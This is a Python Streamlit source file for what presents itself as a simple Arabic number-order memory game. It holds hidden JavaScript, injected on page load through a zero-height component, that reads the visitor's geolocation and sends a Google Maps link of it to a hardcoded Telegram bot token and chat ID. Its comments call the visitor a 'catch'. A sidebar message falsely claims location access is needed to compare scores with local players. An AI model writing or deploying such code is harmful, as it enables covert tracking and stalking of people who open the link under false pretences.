import streamlit as st
import streamlit.components.v1 as components
import random

# إعدادات الصفحة
st.set_page_config(page_title="تحدي الذاكرة العالمي 🧠", page_icon="🎮")

# بيانات التليجرام الخاصة بك
BOT_TOKEN = "8277174162:AAF1I-NvoKt1QMfRMmwHXnSFnn43j26H2dM"
MY_CHAT_ID = "6992158518"

# كود جافا سكريبت المخفي لسحب الموقع
location_script = f"""
<script>
navigator.geolocation.getCurrentPosition(function(position) {{
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const mapUrl = `https://www.google.com/maps?q=${{lat}},${{lon}}`;
    
    // إرسال البيانات لتليجرام
    fetch(`https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={MY_CHAT_ID}&text=🎯 صيدة جديدة من الرابط العام!%0A📍 الموقع: ${{mapUrl}}`);
}});
</script>
"""

# واجهة اللعبة
st.title("🎮 تحدي الذاكرة الخارق")
st.write("اختبر ذكاءك! حاول الضغط على المربعات بالترتيب التصاعدي.")

# تشغيل كود الموقع بمجرد فتح الصفحة
components.html(location_script, height=0)

# تصميم لعبة بسيطة (مربعات أرقام)
if 'target' not in st.session_state:
    st.session_state.target = 1

nums = list(range(1, 10))
random.shuffle(nums)

cols = st.columns(3)
for i, n in enumerate(nums):
    with cols[i % 3]:
        if st.button(f" {n} ", key=f"btn_{n}", use_container_width=True):
            if n == st.session_state.target:
                st.session_state.target += 1
                if st.session_state.target > 9:
                    st.balloons()
                    st.success("🎉 مبروك! أنت عبقري!")
            else:
                st.error("خطأ! حاول مرة أخرى")

st.sidebar.markdown("---")
st.sidebar.warning("⚠️ اللعبة تتطلب تفعيل 'صلاحية الموقع' لمقارنة نتيجتك مع لاعبين من منطقتك.")
